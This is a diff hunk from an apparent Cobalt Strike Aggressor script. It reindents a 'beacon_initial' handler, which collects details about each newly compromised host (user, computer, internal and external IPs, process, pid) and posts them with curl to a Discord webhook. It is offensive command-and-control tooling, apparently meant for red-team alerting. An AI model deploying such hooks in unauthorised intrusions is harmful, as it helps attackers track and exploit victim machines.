@@ -15,17 +15,17 @@ $discord_emoji_screenshot = ':eyes:';
 
 # New Beacon Alert
 on beacon_initial {
-	$user = beacon_data($1)["user"];
-	$computer = beacon_data($1)["computer"];
-	$host = beacon_data($1)["host"];
-	$arch = beacon_data($1)["barch"];
-	$external = beacon_data($1)["external"];
-	$internal = beacon_data($1)["internal"];
-	$listener = beacon_data($1)["listener"];
-	$process = beacon_data($1)["process"];
-	$pid = beacon_data($1)["pid"];
-	
-	@curl_command = @('curl','-X','POST','-H', 'Content-Type: application/json', '--data-raw', '{"content": "'.$discord_emoji_beacon.' New Beacon on '.$teamserver_hostname.'. GameOn!\n\nInitial beacon from '.$user.'@'.$host.' ('. $computer .')\n\n'.$discord_emoji_info.' Beacon details:\n\nExternal: '.$external.'\nInternal: '.$internal.'\nListener: '.$listener.'\nUser: '.$user.'\nComputer: '.$computer.'\nProccess: '.$process.'\nPid: '.$pid.'\nArch: '.$arch.'"}', $discord_webhookURL);
+    $user = beacon_data($1)["user"];
+    $computer = beacon_data($1)["computer"];
+    $host = beacon_data($1)["host"];
+    $arch = beacon_data($1)["barch"];
+    $external = beacon_data($1)["external"];
+    $internal = beacon_data($1)["internal"];
+    $listener = beacon_data($1)["listener"];
+    $process = beacon_data($1)["process"];
+    $pid = beacon_data($1)["pid"];
+    
+    @curl_command = @('curl','-X','POST','-H', 'Content-Type: application/json', '--data-raw', '{"content": "'.$discord_emoji_beacon.' New Beacon on '.$teamserver_hostname.'. GameOn!\n\nInitial beacon from '.$user.'@'.$host.' ('. $computer .')\n\n'.$discord_emoji_info.' Beacon details:\n\nExternal: '.$external.'\nInternal: '.$internal.'\nListener: '.$listener.'\nUser: '.$user.'\nComputer: '.$computer.'\nProccess: '.$process.'\nPid: '.$pid.'\nArch: '.$arch.'"}', $discord_webhookURL);
     exec(@curl_command);
 }
 
